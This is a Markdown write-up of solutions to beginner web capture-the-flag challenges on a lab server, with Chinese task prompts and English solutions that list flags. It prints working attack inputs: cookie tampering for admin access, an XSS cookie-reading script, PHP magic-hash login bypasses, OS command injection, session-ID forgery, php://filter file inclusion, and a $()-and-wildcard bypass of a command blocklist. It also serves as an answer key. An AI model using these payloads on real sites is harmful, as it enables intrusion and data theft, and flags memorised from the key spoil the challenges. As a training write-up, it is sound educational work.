# Web CTF
| Solved                                        | Category | Points |
| --------------------------------------------- | -------- | ------ |
| [Web developer](#web-developer)               | Level 1  | 50     | 
| [Robots.txt](#robotstxt)                      | Level 1  | 50     |
| [Curl-1](#curl-1)                             | Level 1  | 50     |
| [Burp Suite-1](#burp-suite-1)                 | Level 1  | 50     |
| [Burp Suite-2](#burp-suite-2)                 | Level 1  | 50     |
| [flag](#flag)                                 | Level 1  | 50     |
| [XSS](#xss)                                   | Level 2  | 100    |
| [Download](#download)                         | Level 2  | 100    |
| [Command injection](#command-injection)       | Level 2  | 100    |
| [Md5 collision](#md5-collision)               | Level 2  | 100    |
| [sha1 collision](#sha1-collision)             | Level 2  | 100    |
| [gitleak](#gitleak)                           | Level 2  | 100    |
| [easy_lfi](#easy_lfi)                         | Level 2  | 100    |
| [Flashing_Redirect](#flashing_redirect)       | Level 2  | 100    |
| [GuessingAdminSession](#guessingadminsession) | Level 2  | 100    |
| [twofile](#twofile)                           | AdvancedWeb-kaibro0218 | 100 |

## Level 1

### Web developer
`web` `50` `BreakALLCTF{3xjVYR8dMetWQbwzYsLJ}`

> 網站有許多漏洞，從底下的登入網址，你認為有幾種方式可以入侵?
> 
> 提示1 : 如何看到網站的原始碼?  
> 提示2 : 如何從網站的原始碼看到你所需要的資訊?  
> 提示3 : 答案格式 BreakALLCTF{xxxxxxxxxxx}
> 
> 請連結以下網址:  
> http://140.110.112.94:1001/

View source code.

### Robots.txt
`web` `50`

> robots.txt是一種文字檔案，它告訴網路搜尋引擎此網站中的哪些內容是不應被搜尋引擎的搜尋到的，哪些是可以被搜尋引擎搜尋到的。 但駭客卻常透過robots.txt來知道哪些網頁目錄含有重要或是隱私資訊。
> 
> 本題任務是請你找到robots.txt並因此找到flag。  
> 提示1 : robots.txt的存放放置  
> 提示2 : 相關hex to string及base64 編碼  
> 
> 請連結以下網址:  
> http://140.110.112.94:2001/

Try to access `/robots.txt` and know the secret.

```
User-agent: *
Disallow: /images
Disallow: /secret
```

Access `/secret` and the directory shows that there is a flag file
    at `/secret/flag.txt`.

```
516e4a6c595774425445784456455a374e31463053304979546a5655624846425155563651334a36546b3939
```

According to the intructions,
    the code need to do `hex to strings` and `base64 decode` to get the flag.

```python
import base64


key = '516e4a6c595774425445784456455a374e31463053304979546a5655624846425155563651334a36546b3939'

base64.b64decode(key.decode('hex'))
```

### Curl-1
`web` `50` `BreakALLCTF{91YODwgPD58gpC4H9AeD}`

> 網址重新導向(URL redirection)的技術 請到wiki上看看URL redirection的原理及用途 https://zh.wikipedia.org/wiki/網域名稱轉址
> 
> 提示1 : 如何從網站的原始碼找到你所需要的資訊?  
> 提示2 : 本題可以使用curl工具輕鬆解題
> 
> 請連結以下網址進行解題:  
> http://140.110.112.94:2014/

The flag link will be redirected.
Use `curl` to get the content without being redirected.

```bash
$ curl http://140.110.112.94:2014/index.php
BreakALLCTF{91YODwgPD58gpC4H9AeD}
```

### Burp Suite-1
`web` `50` `BreakALLCTF{9a6OalBa6Hh4iRSKczHe}`

> 管理者的網站常是駭客最想登入的地方。 要做到權限控管需要小心設計，因為設計不良的網站，常會使駭客攔截封包後修改並送出，進而造成網站機敏內容外洩。
> 
> 你知道如何使用非管理者身分在設計不良的網站取得管理者權限登入嗎?  
> 本題任務是請你完成上述使命?  
> 提示1: 你知道如何攔截並修改封包嗎?  
> 提示2: 你可以使用Burp Suite等工具
> 
> 請連結以下網址進行解題:  
> http://140.110.112.94:2005/

Set the cookie `user` to `admin` and get the flag.

### Burp Suite-2
`web` `50` `BreakALLCTF{An41YF4o68wjzq4xjYK9}`

> 網站登入權限控管是程式設計人員需特別留意的地方，要做到謹慎的權限控管需要小心設計，因為設計不良的網站，常會使駭客攔截封包後修改並送出，進而造成網站機敏內容外洩。
> 
> 你知道如何使用非登入身分在設計不良的網站取得登入權限嗎?
> 
> 本題任務是請你完成上述使命?
> 
> 提示1: 你知道如何攔截並修改封包嗎?  
> 提示2: 你可以使用Burp Suite等工具，也可以使用Google Chrome 開發者模式輕鬆解題。
> 
> 請連結以下網址:  
> http://140.110.112.94:3002/

Set the cookie `Login` to `1`.

### SQL injection
`web` `50` 

> SQL injection(SQL隱碼攻擊)是最最著名的網站漏洞。  
> 你知道駭客如何使用SQL injection入侵網站嗎?  
> 本題任務是請你使用SQL injection登入網站找到flag。  
> 
> 請特別注意:別使用TANet IP(學術網路)進行本次解題，會被封鎖!  
> 請連結以下網址進行解題:  
> http://140.110.112.94:2002

### flag
`web` `50` `BreakALLCTF{dwExjJly8xU1O8NNZBhG}`

> http://140.110.112.94:4008/

Just view the source.


## Level 2

### XSS
`web` `100` `BreakALLCTF{BQmpK7Ip0IOxclRg5jex}`

> Cross-site scripting(跨網站指令碼攻擊)又稱XSS攻擊，通常是透過HTML或JavaScript這些不在伺服器端執行的程式進行攻擊，可用來竊取使用者的cookie，甚至於冒用使用者的身份。
> 
> 本題任務是使用XSS攻擊竊取cookie。  
> 請使用Firefox瀏覽器較方便解題。
> 
> 提示1 : 取得cookie後請記得做URL decode
> 
> 請連結以下網址:  
> http://140.110.112.94:3003/

Use following payload to do simple `XSS`.

```javascript
<script>console.log(document.cookie)</script>
```

Actually, you can simple get the flag from cookie.

### Md5 collision
`web` `100` `BreakALLCTF{CH82GiBlijFZbLqd1Y6V}`

> MD5加密是一種被近年被廣泛使用的密碼雜湊函式，可以產生出一個128位元的雜湊值(hash)，用於確保資訊傳輸完整一致，甚至做為密碼加密用途。
> 
> 但MD5加密真的安全嗎?近年已發現MD5碰撞(md5 collision)問題。  
> 本題任務請你使用md5 collision技術登入取得flag。
> 
> 請連結以下網址:  
> http://140.110.112.94:3004/

Use `php` week type vulnerability to bypass password checking.
`php` will treat `0exxxxx...` as scientific notation, which is `0`.
We just need to find a md5 hash value online which start with `0e`.

```
username=admin&password=QNKCDZO
-------------------------------
BreakALLCTF{CH82GiBlijFZbLqd1Y6V}
```

### Download
`web` `100` `BreakALLCTF{CvyBO1GEhqiPpoBD3UE3}`

> 網站如開放使用下載功能需特別留意，因為設計不良的下載功能，常會使駭客透過下載功能竊取網站原始碼，進而造成網站機敏內容外洩。
> 
> 提示1 :請問你對Base64編碼與解碼的技術了解嗎?  
> 提示2 :你知道如何透過設計不良的網站下載功能取得網站原始碼嗎?
> 
> 請連結以下網址:  
> http://140.110.112.94:3005/

The download link is in the format:
    `http://140.110.112.94:3005/download.php?url=<filename in base64 encode>`.
The first thing is that download the `download.php` to check the code.

```php
curl http://140.110.112.94:3005/download.php?url=ZG93bmxvYWQucGhw
-----------------------------------------------------------------
<?php
error_reporting(0);
include("flag.php");
$url=base64_decode($_GET[url]);
if( $url=="flag.php" || $url=="download.php" || $url=="sleepingsheep.mp3" || $url=="ourfrenchcafe.mp3"){

        header ( "Content-Disposition: attachment; filename=".$url);
        echo(file_get_contents($url));
        exit;
}
else {
        echo "沒有權限!";
}
```

There is a suspicious file called `flag.php`.
Try to download the file and get the flag.

```php
curl http://140.110.112.94:3005/download.php?url=ZmxhZy5waHA=
-------------------------------------------------------------
<?php
//BreakALLCTF{CvyBO1GEhqiPpoBD3UE3}
```

### Command injection
`web` `100` `MyFirstCTF{JuMs3v3dPI2l927pJg3a}`

> InsecureTeleCOM公司為增加使用者的忠誠度特提供一系列的網路服務，其中一項便是佈建網站來提供dns線上查詢功能。  
> 為增加其網站安全，InsecureTeleCOM公司委託MyFirstSecurity資安團隊針對其網站進行滲透測試，MyFirstSecurity資深滲透測試專家很快就檢測出該服務具有長期高居OWASP TOP 10第一名的injection flaw。  
> 具有高度資安學習熱情並將以安全專家捍衛家園作為終身職志的志明由於才剛入門，因此嘗試許多SQLi的滲透測試，但卻無所獲。  
> MyFirstSecurity資深滲透測試專家看到志明的積極與主動，感動之餘便告訴志明有許多injection技術，建議他看看Command injection的漏洞。  
> 志明再度發揮他積極與主動的精神，上網並測試許多類型的OS Command injection，在他詳細的簡報與深度的演講中，已經讓人看到眾所期待的新星正在發光。  
> 
> 故事講完後 ，就輪到你來努力!請連結以下網址並完成相關測試:  
> http://140.110.112.94:1004/

Use `;` to seperate the commands.
The `flag` is at `/var/www/flag`.

```
; cat /var/www/flag
-------------------
MyFirstCTF{JuMs3v3dPI2l927pJg3a}
```

### sha1 collision
`web` `100` `MyFirstCTF{TkGmox1lPqfFzAclbCF2}`

> 2017年2月23日google在底下網址宣稱已經成功攻破sha1  
> https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html
> 
> 你知道這會有甚麼問題嗎？
> 
> 題目網址中顯示PHP原始碼使用SHA1函示對使用者輸入的密碼進行hash，請你使用根據sha1 collision原理登入以下網址取得flag:
> 
> 請連結以下網址:  
> http://140.110.112.94:4114/
> 
> 提示1:SHA1為美國國家安全局（National Security Agency，NSA）所設計並於1995年發表的加密雜湊函數，隨後亦成為美國聯邦資料處理標準。有關SHA1加密雜湊函數，請參看維基百科的說明:  
> https://zh.wikipedia.org/wiki/SHA-1  
> 提示2:SHAttered attack的資料請參看  
> https://shattered.io/

Same as [Md5 collision](#md5-collision).

```
username=admin&password=aaroZmOk
--------------------------------
MyFirstCTF{TkGmox1lPqfFzAclbCF2}
```

### GuessingAdminSession
`web` `100` `MyFirstCTF{LrAbX0xPq9dP3CfyXNVc}`

> 滲透測試專家在測試InsecurBank的網站系統時，發現用來認證登入的session不夠嚴謹，很容易被猜出session來。證明你有能力善用工具來登入設計不良的網站取得管理者(admin)權限!
> 
> 帳號:barry  
> 密碼:barry
> 
> 帳號:clara  
> 密碼:clara
> 
> 提示1: 你知道如何攔截並修改封包嗎?  
> 提示2: burpsuite會對你有所幫助  
> 提示3: 請嘗試登入admin帳號  
> 提示4: 相關說明請參看  
> https://www.owasp.org/index.php/Top_10-2017_Top_10  
> A2:2017-Broken Authentication
> 
> 請連結以下網址進行解題:  
> http://140.110.112.94:1007/

Use `barry` and `clara` to login and get two `PHPSESSID`, which are:

```
LrlMbNfpKaBjmJryXtkrroWky
LrlMcNfpKlBjmJayXtkrroWka
```

The differece between two `PHPSESSID` is the `user` name.
`user` name is inserted every 5 char.
Modify the `PHPSESSID` to login as `admin`.

```
LrlMaNfpKdBjmJmyXtkiroWkn
```

### Flashing\_Redirect
`web` `100` `MyFirstCTF{KmsFwo5ZNcbVS2fZgL0w}`

> 快閃式的重導向(Redirect)總是讓你眼花!
> 
> 捉住稍縱即逝的機會是你人生必修課題，參加競賽的你已經踏出第一步!恭喜恭喜!
> 
> 接著你要學習捉住稍縱即逝的網頁，請連結以下網址:  
> http://140.110.112.94:1005/
> 
> 提示1: Curl會對你有所幫助,請參閱維基百科說明  
> https://en.wikipedia.org/wiki/CURL

Use `curl` to prevent redirect.

```html
curl http://140.110.112.94:1005/jump.php
----------------------------------------
<meta http-equiv="refresh" content="0; url=jump_again.php">
```

```html
curl http://140.110.112.94:1005/jump_again.php
----------------------------------------------
MyFirstCTF{KmsFwo5ZNcbVS2fZgL0w}
恭喜你抓到flag了!!!
```

### gitleak
`web` `100` `FLAG{oh_ya_git_G___G}`

> http://140.110.112.94:4004/

There is `.git` directory at `http://140.110.112.94:4004/.git`.
Then use `https://github.com/arthaud/git-dumper` to dump all files in `.git`.
Reset to commit `flag is here` and find the flag.

### easy\_lfi
`web` `100` `FLAG{../../../../wow/lfi/is/so/easy/XD}`

> http://140.110.112.94:4005

Simple `LFI` problem.
Use `php://` to get `index.php`.

```php
http://140.110.112.94:4005/?f=php://filter/convert.base64-encode/resource=/var/www/html/index.php
-------------------------------------------------------------------------------------------------
...
<?php
// here is no flag Q___Q
// flag is in /flag
$f = $_GET['f'];
if(stripos($f, "../") !== FALSE) {
  echo "<div class='alert alert-danger' role='alert'>Oops! ../ will be filtered. You are Bad Hacker!</div>";
  $f = str_replace("../","",$f);
}
include($f);
?>
...
```

Then we know the flag position.

```
http://140.110.112.94:4005/?f=/flag
-----------------------------------
FLAG{../../../../wow/lfi/is/so/easy/XD}
```


## AdvancedWeb-kaibro0218

### twofile
`web` `100` `FLAG{e4sy_w4f_byp4s5_0h_y4_XD__}`

> http://140.110.112.94:6009/

I don't really know why we need two files.
`-r` is optional.

```php
<?php

highlight_file(__FILE__);

$file1 = $_GET['f1'];
$file2 = $_GET['f2'];

// WAF
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|<|&&|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file1))
    $file1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|<|&&|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file2))
    $file2 = "";

// Prevent injection
$file1 = '"' . $file1 . '"';
$file2 = '"' . $file2 . '"';

$cmd = "file $file1 $file2";
system($cmd);
```

Try to use `$()` to execute command and success.
Then try to find the flag file.
Use `?` to escape `WAF`, and finally get the flag.

```
http://140.110.112.94:6009/?f1=-r&f2=$(/bin/fi?d fl?g)
------------------------------------------------------
flag flag/flag_15_here.txt: cannot open `flag flag/flag_15_here.txt' (No such file or directory)
```

```
http://140.110.112.94:6009/?f1=-r&f2=$(head fl?g/fl?g_15_here.txt)
------------------------------------------------------------------
FLAG{e4sy_w4f_byp4s5_0h_y4_XD__}: cannot open `FLAG{e4sy_w4f_byp4s5_0h_y4_XD__}' (No such file or directory)
```
